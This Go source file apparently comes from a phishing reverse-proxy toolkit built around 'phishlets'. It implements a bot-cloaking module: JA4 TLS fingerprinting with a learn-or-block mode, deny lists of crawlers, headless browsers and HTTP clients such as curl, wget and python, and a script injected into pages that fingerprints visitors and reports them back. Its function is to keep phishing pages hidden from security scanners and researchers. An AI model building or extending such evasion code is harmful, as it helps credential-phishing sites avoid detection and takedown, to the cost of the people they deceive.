package core

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/inconshreveable/go-vhost"
)

// JA4Signature holds components of a JA4 TLS fingerprint
type JA4Signature struct {
	Raw           string // Full JA4 string
	TLSVersion    string // e.g., "t13"
	SNIIndicator  string // "d" for domain, "i" for IP
	CipherCount   int    // Number of cipher suites
	ExtCount      int    // Number of extensions
	ALPN          string // First ALPN protocol indicator
	CipherHash    string // First 12 chars of sha256 of sorted ciphers
	ExtensionHash string // First 12 chars of sha256 of sorted extensions
}

// JA4Record stores observed JA4 signatures for learning mode
type JA4Record struct {
	Signature   string
	Count       int
	FirstSeen   time.Time
	LastSeen    time.Time
	RemoteAddrs []string // Sample IPs (max 5)
	UserAgents  []string // Sample user agents (max 5)
	Phishlet    string
}

// TelemetryData from browser fp-collect
type TelemetryData struct {
	UserAgent   string   `json:"userAgent"`
	WebDriver   bool     `json:"webdriver"`
	Headless    bool     `json:"headless"`
	Puppeteer   bool     `json:"puppeteer"`
	Playwright  bool     `json:"playwright"`
	Selenium    bool     `json:"selenium"`
	PhantomJS   bool     `json:"phantomjs"`
	Languages   []string `json:"languages"`
	Platform    string   `json:"platform"`
	Plugins     int      `json:"plugins"`
	ScreenRes   string   `json:"screenRes"`
	Timezone    string   `json:"timezone"`
}

// CrawlfenceConfig per-phishlet configuration
type CrawlfenceConfig struct {
	Enabled   bool
	JA4Config *CrawlfenceJA4Config
	Telemetry *CrawlfenceTelemetryConfig
}

// CrawlfenceJA4Config configuration for JA4 fingerprinting
type CrawlfenceJA4Config struct {
	Mode      string   // "learn", "block", "off"
	Whitelist []string // Allow only these JA4 signatures
	Blacklist []string // Block these JA4 signatures
}

// CrawlfenceTelemetryConfig configuration for browser telemetry
type CrawlfenceTelemetryConfig struct {
	Enabled     bool
	UABlacklist []string         // User-agent patterns to block (regex)
	uaPatterns  []*regexp.Regexp // Compiled regex patterns
}

// CrawlFence main structure for bot detection
type CrawlFence struct {
	ja4Records    map[string]*JA4Record // JA4 signature -> record
	ja4Mtx        sync.RWMutex
	sessionJA4    map[string]string // session_id -> JA4 signature
	sessionJA4Mtx sync.RWMutex
	ipJA4         map[string]string // IP -> last JA4 signature
	ipJA4Mtx      sync.RWMutex
}

// Built-in automation detection patterns (not configurable)
var AutomationIndicators = []string{
	"HeadlessChrome",
	"PhantomJS",
	"Puppeteer",
	"Playwright",
	"Selenium",
	"WebDriver",
	"Chrome-Lighthouse",
	"Googlebot",
	"AhrefsBot",
	"SemrushBot",
	"DotBot",
	"BingBot",
	"YandexBot",
	"PetalBot",
	"bingbot",
	"MJ12bot",
	"Baiduspider",
}

// DefaultUABlacklist built-in user-agent blacklist patterns
var DefaultUABlacklist = []string{
	`(?i)python`,
	`(?i)curl\/`,
	`(?i)wget\/`,
	`(?i)libwww`,
	`(?i)httplib`,
	`(?i)scrapy`,
	`(?i)httpclient`,
	`(?i)java\/`,
	`(?i)okhttp`,
	`(?i)apache-httpclient`,
	`(?i)go-http-client`,
	`(?i)node-fetch`,
	`(?i)axios`,
}

// NewCrawlFence creates a new CrawlFence instance
func NewCrawlFence() *CrawlFence {
	return &CrawlFence{
		ja4Records: make(map[string]*JA4Record),
		sessionJA4: make(map[string]string),
		ipJA4:      make(map[string]string),
	}
}

// GenerateJA4 creates JA4 signature from ClientHello data
func GenerateJA4(clientHello *vhost.ClientHelloMsg) *JA4Signature {
	if clientHello == nil {
		return nil
	}

	ja4 := &JA4Signature{}

	// 1. TLS Version - use supported_versions extension if present, else record version
	tlsVer := clientHello.Vers
	if len(clientHello.SupportedVersions) > 0 {
		// Use highest supported version from extension
		for _, v := range clientHello.SupportedVersions {
			if v > tlsVer && !isGREASEValue(v) {
				tlsVer = v
			}
		}
	}

	// Convert TLS version to JA4 format
	switch tlsVer {
	case 0x0304:
		ja4.TLSVersion = "t13"
	case 0x0303:
		ja4.TLSVersion = "t12"
	case 0x0302:
		ja4.TLSVersion = "t11"
	case 0x0301:
		ja4.TLSVersion = "t10"
	default:
		ja4.TLSVersion = fmt.Sprintf("t%02x", tlsVer&0xFF)
	}

	// 2. SNI indicator: "d" if SNI present, "i" if IP used or empty
	if clientHello.ServerName != "" {
		ja4.SNIIndicator = "d"
	} else {
		ja4.SNIIndicator = "i"
	}

	// 3. Number of cipher suites (excluding GREASE)
	ciphers := filterGREASE(clientHello.CipherSuites)
	ja4.CipherCount = len(ciphers)
	if ja4.CipherCount > 99 {
		ja4.CipherCount = 99
	}

	// 4. Number of extensions (excluding GREASE)
	extensions := filterGREASEExtensions(clientHello.ExtensionTypes)
	ja4.ExtCount = len(extensions)
	if ja4.ExtCount > 99 {
		ja4.ExtCount = 99
	}

	// 5. ALPN - first alpn value: "h2" for http/2, "h1" for http/1.1, "00" for none
	ja4.ALPN = "00"
	if len(clientHello.ALPNProtocols) > 0 {
		firstALPN := clientHello.ALPNProtocols[0]
		if firstALPN == "h2" {
			ja4.ALPN = "h2"
		} else if firstALPN == "http/1.1" {
			ja4.ALPN = "h1"
		} else if len(firstALPN) >= 2 {
			ja4.ALPN = firstALPN[:2]
		}
	}

	// 6. Cipher suites hash - sorted, GREASE removed, sha256 truncated to 12 chars
	sort.Slice(ciphers, func(i, j int) bool { return ciphers[i] < ciphers[j] })
	cipherStr := formatCipherSuites(ciphers)
	ja4.CipherHash = sha256Hash12(cipherStr)

	// 7. Extensions hash - sorted by type, GREASE removed, sha256 truncated to 12 chars
	// Also include signature algorithms in the hash if present
	sort.Slice(extensions, func(i, j int) bool { return extensions[i] < extensions[j] })
	extStr := formatExtensions(extensions)
	if len(clientHello.SignatureAlgos) > 0 {
		sigAlgos := filterGREASE(clientHello.SignatureAlgos)
		sort.Slice(sigAlgos, func(i, j int) bool { return sigAlgos[i] < sigAlgos[j] })
		extStr += "_" + formatCipherSuites(sigAlgos)
	}
	ja4.ExtensionHash = sha256Hash12(extStr)

	// Compose final signature: TLSVersion + SNI + CipherCount + ExtCount + ALPN _ CipherHash _ ExtHash
	ja4.Raw = fmt.Sprintf("%s%s%02d%02d%s_%s_%s",
		ja4.TLSVersion, ja4.SNIIndicator, ja4.CipherCount, ja4.ExtCount, ja4.ALPN,
		ja4.CipherHash, ja4.ExtensionHash)

	return ja4
}

// isGREASEValue checks if a value is a GREASE value
func isGREASEValue(val uint16) bool {
	// GREASE values: 0x0a0a, 0x1a1a, 0x2a2a, ... 0xfafa
	return (val & 0x0f0f) == 0x0a0a
}

// filterGREASE removes GREASE values from cipher suite list
func filterGREASE(values []uint16) []uint16 {
	var result []uint16
	for _, v := range values {
		if !isGREASEValue(v) {
			result = append(result, v)
		}
	}
	return result
}

// filterGREASEExtensions removes GREASE extension types
func filterGREASEExtensions(extensions []uint16) []uint16 {
	return filterGREASE(extensions)
}

// formatCipherSuites formats cipher suites as comma-separated hex values
func formatCipherSuites(ciphers []uint16) string {
	var parts []string
	for _, c := range ciphers {
		parts = append(parts, fmt.Sprintf("%04x", c))
	}
	return strings.Join(parts, ",")
}

// formatExtensions formats extension types as comma-separated hex values
func formatExtensions(extensions []uint16) string {
	var parts []string
	for _, e := range extensions {
		parts = append(parts, fmt.Sprintf("%04x", e))
	}
	return strings.Join(parts, ",")
}

// sha256Hash12 returns first 12 characters of sha256 hash
func sha256Hash12(s string) string {
	if s == "" {
		return "000000000000"
	}
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])[:12]
}

// SetIPJA4 stores JA4 signature for an IP address
func (cf *CrawlFence) SetIPJA4(ip string, ja4 string) {
	cf.ipJA4Mtx.Lock()
	defer cf.ipJA4Mtx.Unlock()
	cf.ipJA4[ip] = ja4
}

// GetIPJA4 retrieves JA4 signature for an IP address
func (cf *CrawlFence) GetIPJA4(ip string) string {
	cf.ipJA4Mtx.RLock()
	defer cf.ipJA4Mtx.RUnlock()
	return cf.ipJA4[ip]
}

// SetSessionJA4 associates JA4 signature with a session
func (cf *CrawlFence) SetSessionJA4(sessionId string, ja4 string) {
	cf.sessionJA4Mtx.Lock()
	defer cf.sessionJA4Mtx.Unlock()
	cf.sessionJA4[sessionId] = ja4
}

// GetSessionJA4 retrieves JA4 signature for a session
func (cf *CrawlFence) GetSessionJA4(sessionId string) string {
	cf.sessionJA4Mtx.RLock()
	defer cf.sessionJA4Mtx.RUnlock()
	return cf.sessionJA4[sessionId]
}

// RecordJA4 stores JA4 for learning mode
func (cf *CrawlFence) RecordJA4(phishlet string, ja4 string, remoteAddr string, userAgent string) {
	cf.ja4Mtx.Lock()
	defer cf.ja4Mtx.Unlock()

	key := phishlet + ":" + ja4
	record, exists := cf.ja4Records[key]
	if !exists {
		record = &JA4Record{
			Signature:   ja4,
			Count:       0,
			FirstSeen:   time.Now(),
			RemoteAddrs: []string{},
			UserAgents:  []string{},
			Phishlet:    phishlet,
		}
		cf.ja4Records[key] = record
	}

	record.Count++
	record.LastSeen = time.Now()

	// Keep sample IPs (max 5)
	if remoteAddr != "" && len(record.RemoteAddrs) < 5 {
		found := false
		for _, addr := range record.RemoteAddrs {
			if addr == remoteAddr {
				found = true
				break
			}
		}
		if !found {
			record.RemoteAddrs = append(record.RemoteAddrs, remoteAddr)
		}
	}

	// Keep sample user agents (max 5)
	if userAgent != "" && len(record.UserAgents) < 5 {
		found := false
		for _, ua := range record.UserAgents {
			if ua == userAgent {
				found = true
				break
			}
		}
		if !found {
			record.UserAgents = append(record.UserAgents, userAgent)
		}
	}
}

// CheckJA4 validates JA4 against whitelist/blacklist
// Returns (allowed bool, reason string)
func (cf *CrawlFence) CheckJA4(cfgJA4 *CrawlfenceJA4Config, ja4 string) (bool, string) {
	if cfgJA4 == nil || cfgJA4.Mode != "block" {
		return true, ""
	}

	// Check blacklist first (takes precedence)
	for _, blocked := range cfgJA4.Blacklist {
		if blocked == ja4 {
			return false, "ja4 blacklisted"
		}
	}

	// If whitelist is empty, allow all non-blacklisted
	if len(cfgJA4.Whitelist) == 0 {
		return true, ""
	}

	// Check whitelist
	for _, allowed := range cfgJA4.Whitelist {
		if allowed == ja4 {
			return true, ""
		}
	}

	return false, "ja4 not in whitelist"
}

// CheckTelemetry validates browser telemetry
// Returns (allowed bool, reason string)
func (cf *CrawlFence) CheckTelemetry(cfgTelemetry *CrawlfenceTelemetryConfig, data *TelemetryData) (bool, string) {
	if cfgTelemetry == nil || !cfgTelemetry.Enabled {
		return true, ""
	}

	// Check automation flags
	if data.WebDriver {
		return false, "webdriver detected"
	}
	if data.Headless {
		return false, "headless browser detected"
	}
	if data.Puppeteer {
		return false, "puppeteer detected"
	}
	if data.Playwright {
		return false, "playwright detected"
	}
	if data.Selenium {
		return false, "selenium detected"
	}
	if data.PhantomJS {
		return false, "phantomjs detected"
	}

	// Check built-in automation indicators in user agent
	for _, indicator := range AutomationIndicators {
		if strings.Contains(data.UserAgent, indicator) {
			return false, fmt.Sprintf("automation indicator in ua: %s", indicator)
		}
	}

	// Check built-in UA blacklist patterns
	for _, pattern := range DefaultUABlacklist {
		if re, err := regexp.Compile(pattern); err == nil {
			if re.MatchString(data.UserAgent) {
				return false, fmt.Sprintf("ua matches default blacklist: %s", pattern)
			}
		}
	}

	// Check custom UA blacklist patterns
	for _, re := range cfgTelemetry.uaPatterns {
		if re.MatchString(data.UserAgent) {
			return false, fmt.Sprintf("ua matches custom blacklist: %s", re.String())
		}
	}

	return true, ""
}

// CheckUserAgent validates user agent against patterns
// Returns (allowed bool, reason string)
func (cf *CrawlFence) CheckUserAgent(cfgTelemetry *CrawlfenceTelemetryConfig, userAgent string) (bool, string) {
	if cfgTelemetry == nil || !cfgTelemetry.Enabled {
		return true, ""
	}

	// Check built-in automation indicators
	for _, indicator := range AutomationIndicators {
		if strings.Contains(userAgent, indicator) {
			return false, fmt.Sprintf("automation indicator: %s", indicator)
		}
	}

	// Check built-in UA blacklist patterns
	for _, pattern := range DefaultUABlacklist {
		if re, err := regexp.Compile(pattern); err == nil {
			if re.MatchString(userAgent) {
				return false, fmt.Sprintf("ua matches default blacklist: %s", pattern)
			}
		}
	}

	// Check custom UA blacklist patterns
	for _, re := range cfgTelemetry.uaPatterns {
		if re.MatchString(userAgent) {
			return false, fmt.Sprintf("ua matches custom blacklist: %s", re.String())
		}
	}

	return true, ""
}

// GetJA4Stats returns learning mode statistics
func (cf *CrawlFence) GetJA4Stats(phishlet string) []*JA4Record {
	cf.ja4Mtx.RLock()
	defer cf.ja4Mtx.RUnlock()

	var records []*JA4Record
	for _, record := range cf.ja4Records {
		if phishlet == "all" || record.Phishlet == phishlet {
			records = append(records, record)
		}
	}

	// Sort by count descending
	sort.Slice(records, func(i, j int) bool {
		return records[i].Count > records[j].Count
	})

	return records
}

// ClearJA4Stats clears learning data
func (cf *CrawlFence) ClearJA4Stats(phishlet string) {
	cf.ja4Mtx.Lock()
	defer cf.ja4Mtx.Unlock()

	if phishlet == "all" {
		cf.ja4Records = make(map[string]*JA4Record)
	} else {
		for key, record := range cf.ja4Records {
			if record.Phishlet == phishlet {
				delete(cf.ja4Records, key)
			}
		}
	}
}

// CompileTelemetryPatterns compiles UA blacklist regex patterns
func CompileTelemetryPatterns(patterns []string) []*regexp.Regexp {
	var compiled []*regexp.Regexp
	for _, pattern := range patterns {
		if re, err := regexp.Compile(pattern); err == nil {
			compiled = append(compiled, re)
		}
	}
	return compiled
}

// GenerateCrawlfenceScript returns JavaScript for browser telemetry collection
func GenerateCrawlfenceScript(sessionId string) string {
	return fmt.Sprintf(`<script>
(function(){
try{
var d={
userAgent:navigator.userAgent||'',
webdriver:!!navigator.webdriver,
headless:(/HeadlessChrome/.test(navigator.userAgent)||window.navigator.webdriver===true),
languages:navigator.languages||[navigator.language],
platform:navigator.platform||'',
plugins:(navigator.plugins?navigator.plugins.length:0),
screenRes:(screen.width||0)+'x'+(screen.height||0),
timezone:(Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:'')
};
d.puppeteer=!!(window.__puppeteer_evaluation_script__||window.__PUPPETEER_BINDING);
d.playwright=!!window.__playwright;
d.selenium=!!(window._selenium||window.callSelenium||document.__selenium_evaluate||document.__selenium_unwrapped||window.__webdriver_script_fn);
d.phantomjs=!!(window.callPhantom||window._phantom);
var x=new XMLHttpRequest();
x.open('POST','/cf/%s',true);
x.setRequestHeader('Content-Type','application/json');
x.send(JSON.stringify(d));
}catch(e){}
})();
</script>`, sessionId)
}
